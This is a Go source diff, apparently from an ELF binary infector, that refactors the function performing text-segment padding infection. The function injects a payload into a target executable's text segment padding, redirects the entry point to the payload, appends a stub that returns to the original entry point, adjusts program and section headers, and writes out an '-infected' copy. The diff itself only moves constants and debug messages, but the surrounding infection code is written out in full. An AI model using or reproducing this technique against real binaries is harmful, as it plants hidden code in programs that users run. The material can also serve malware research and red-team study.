@@ -9,24 +9,20 @@ import (
 	"io/ioutil"
 )
 
-const (
-	PAGE_SIZE                       int    = 0x1000
-	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
-	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
-	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
-	PAYLOAD_LEN_PRE_EPILOGUE        string = "[+] Payload size pre-epilogue 0x%x\n"
-	PAYLOAD_LEN_POST_EPILOGUE       string = "[+] Payload size post-epilogue 0x%x\n"
-	GENERATE_AND_APPEND_PIC_STUB    string = "[+] Generated and appended position independent return 2 OEP stub to payload"
-	INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
-	ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x\n"
-	INCREASE_PHEADER_AT_INDEX_BY    string = "Inceasing pHeader @ index %d by 0x%x\n"
-	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
-	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
-	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
-	ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"
-)
-
 func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
+	const (
+		PAGE_SIZE                       int    = 0x1000
+		TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
+		TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
+		INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
+		ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x\n"
+		INCREASE_PHEADER_AT_INDEX_BY    string = "\tInceasing pHeader @ index %d by 0x%x\n"
+		INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
+		UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
+		EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
+		ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"
+	)
+
 	var textSegEnd interface{}
 	var oShoff interface{}
 
@@ -56,18 +52,19 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 		} else {
 			t.Hdr.(*elf.Header64).Entry = newEntry
+			t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
 		}
-
-		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
 
 		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
 		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint64))
+
 		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 
 		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration64)
+			t.printDebugMsg(DEFAULT_RESTORATION_APPENDED)
 		}
 
 		if !((opts & NoRetOEP) == NoRetOEP) {
@@ -77,10 +74,13 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 			} else {
 				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			}
+
 			t.Payload.Write(retStub)
+			t.printDebugMsg(GENERATED_AND_APPEND_PIC_STUB)
 		}
 
 		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+
 		if t.Debug {
 			printPayload(t.Payload.Bytes())
 		}
@@ -88,7 +88,6 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
 		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())
 
-		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
 		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
 		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 
@@ -133,18 +132,19 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 		} else {
 			t.Hdr.(*elf.Header32).Entry = newEntry
+			t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 		}
-
-		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
 
 		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
 		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint32))
+
 		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 
 		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration32)
+			t.printDebugMsg(DEFAULT_RESTORATION_APPENDED)
 		}
 
 		if !((opts & NoRetOEP) == NoRetOEP) {
@@ -155,10 +155,13 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 			} else {
 				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
 			}
+
 			t.Payload.Write(retStub)
+			t.printDebugMsg(GENERATED_AND_APPEND_PIC_STUB)
 		}
 
 		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+
 		if t.Debug {
 			printPayload(t.Payload.Bytes())
 		}
@@ -166,7 +169,6 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 		t.Phdrs.([]elf.Prog32)[textNdx].Memsz += uint32(t.Payload.Len())
 		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())
 
-		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
 		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
 		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 
@@ -252,11 +254,11 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 	copy(finalInfectionTwo, finalInfection[:endOfInfection])
 
-	t.printDebugMsg("[+] writing payload into the binary")
+	t.printDebugMsg(WRITE_PAYLOAD)
 
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
 	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
-	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
+	infectedFileName := fmt.Sprintf(INFECTED_NAME, t.Fh.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
 		return err
